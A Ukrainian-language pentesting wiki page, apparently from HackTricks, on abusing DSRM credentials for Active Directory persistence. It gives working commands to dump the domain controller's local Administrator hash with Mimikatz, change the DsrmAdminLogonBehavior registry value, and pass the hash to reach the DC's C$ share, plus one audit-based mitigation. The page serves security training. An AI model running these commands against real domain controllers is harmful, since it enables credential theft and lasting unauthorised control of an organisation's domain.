# Облікові дані DSRM

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Усередині кожного **DC** є обліковий запис **локального адміністратора**. Маючи права адміністратора на цій машині, ви можете використати mimikatz, щоб **видобути хеш локального облікового запису Administrator**. Потім, змінивши реєстр, **активувати цей пароль**, щоб отримати віддалений доступ до цього локального користувача Administrator.\
Спочатку потрібно **видобути** **хеш** користувача **локального Administrator** у DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Потім потрібно перевірити, чи працюватиме цей обліковий запис, і якщо ключ реєстру має значення "0" або не існує, потрібно **встановити для нього значення "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Потім, використовуючи PTH, ви можете **перелічити вміст C$ або навіть отримати shell**. Зверніть увагу, що для створення нового сеансу PowerShell із цим хешем у пам’яті (для PTH) **як "domain" використовується лише ім’я машини DC**:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Більше інформації про це: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) і [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Заходи пом'якшення

- ID події 4657 — аудит створення/зміни `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Посилання

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
